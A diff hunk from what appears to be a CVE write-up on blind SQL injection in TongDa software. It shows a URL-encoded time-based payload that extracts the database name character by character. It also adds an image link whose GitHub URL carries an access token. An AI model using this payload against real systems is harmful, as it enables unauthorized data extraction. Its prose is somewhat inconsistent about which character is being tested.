@@ -64,7 +64,7 @@ The fourth digit of the database is intercepted through blind injection, and the
 1)%20and%20(substr(DATABASE(),4,1))=char(111)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)%20and(1)=(1
 ```
 
-![image-20240126100122531](G:\北理工\研一\灵通测\二期\漏洞挖掘\cve2\CVE\TongDa Sql inject.assets\image-20240126100122531.png)
+[![image-20240126100122531](G:\北理工\研一\灵通测\二期\漏洞挖掘\cve2\CVE\TongDa Sql inject.assets\image-20240126100122531.png)](https://raw.githubusercontent.com/rockersiyuan/CVE/main/TongDa%20Sql%20inject.assets/image-20240126100122531.png?token=GHSAT0AAAAAACNLZOLNOH24CMBG7JKGSIU2ZNTDT2A)
 
 The fifth digit of the database is intercepted through blind injection, and the second digit is judged to be the letter a through the delay time, and the ASCII code is 97.
 
